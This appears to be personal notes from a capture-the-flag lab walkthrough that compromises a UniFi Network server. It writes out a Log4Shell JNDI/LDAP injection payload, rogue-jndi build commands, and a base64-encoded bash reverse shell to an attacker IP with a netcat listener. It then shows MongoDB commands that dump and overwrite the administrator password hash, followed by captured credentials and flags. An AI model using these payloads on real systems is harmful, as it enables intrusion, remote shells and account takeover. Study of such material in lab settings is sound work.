[[ping]] the host
sudo nmap -sC  -sV --min-rate=1000 \[host]
*The scan reveals port 8080 open running an HTTP proxy. The proxy appears to redirect requests to port 8443 , which seems to be running an SSL web server. We take note that the HTTP title of the page on port 8443 is " UniFi Network " Version number is 6.4.54 upon visiting the website using port 8443*
*Open Burpsuite and capture requests in Proxy. Login with random credentials and capture request. Send to Repeater. Use remember parameter for OS command injection with [[JNDI]] and [[ldap]]*
"${jndi:ldap://[attacker host IP]/whatever}"
sudo tcpdump -i tun0 port 389
*Press send again in Burp Repeater and see that tcpdump has intercepted some packets. The tcpdump output shows a connection being received on our machine. This proves that the application is indeed vulnerable since it is trying to connect back to us on the LDAP port 389. We will have to install Open-JDK and Maven on our system in order to build a payload that we can send to the server and will give us Remote Code Execution on the vulnerable system.*

sudo apt update
sudo apt install openjdk-11-jdk -y
sudo apt-get install maven
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package

*This will create a .jar file in rogue-jndi/target/ directory called RogueJndi-1.1.jar . Now we can construct our payload to pass into the RogueJndi-1-1.jar Java application. To use the Rogue-JNDI server we will have to construct and pass it a payload, which will be responsible for giving us a shell on the affected system. We will be Base64 encoding the payload to prevent any encoding issues.*

echo 'bash -c bash -i >&/dev/tcp/\[attacker IP address]/6666 0>&1' | base64

java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}| {base64,-d}|{bash,-i}" --hostname "{YOUR TUN0 IP ADDRESS}"

java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMzMvNDQ0NCAwPiYxCg\==}|{base64,-d}|{bash,-i}" --hostname "10.10.14.33"

*Now that the server is listening locally on port 389 , let's open another terminal and start a Netcat listener to capture the reverse shell.*
nc -lvp 4444

*in Burp repeater:*
${jndi:ldap://\[attacker host IP]:1389/o=tomcat}

*After sending the request, a connection to our rogue server is received and the following message is shown. Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload. Upgrade the terminal in nc:*
script /dev/null -c bash
find / -type f -name "user.txt" 2>/dev/null
cat /user/michael/user.txt *6ced1a6a89e666c0620cdb10262ba127*

*The article states we can get access to the administrator panel of the UniFi application and possibly extract SSH secrets used between the appliances. First let's check if MongoDB is running on the target system, which might make it possible for us to extract credentials in order to login to the administrative panel*

ps aux | grep mongo

*A quick Google search using the keywords UniFi Default Database shows that the default database name for the UniFi application is ace .*
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);" *--eval is eval script*

*password has is located in x_shadow variable. change the x_shadow password hash with our very own created hash in order to replace the administrators password and authenticate to the administrative panel. To do this we can use the mkpasswd command line utility.*

mkpasswd -m sha-512 Password1234

mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'

*Log in as administartor:Password1234 Navigate to Settings -> Site -> scroll down and find SSH authentication password: NotACrackablePassword4U2022*
find / -type f -name "root.txt" 2>/dev/null
cat /root/root.txt *e50bc93c75b634e4b272d2f771c33681*
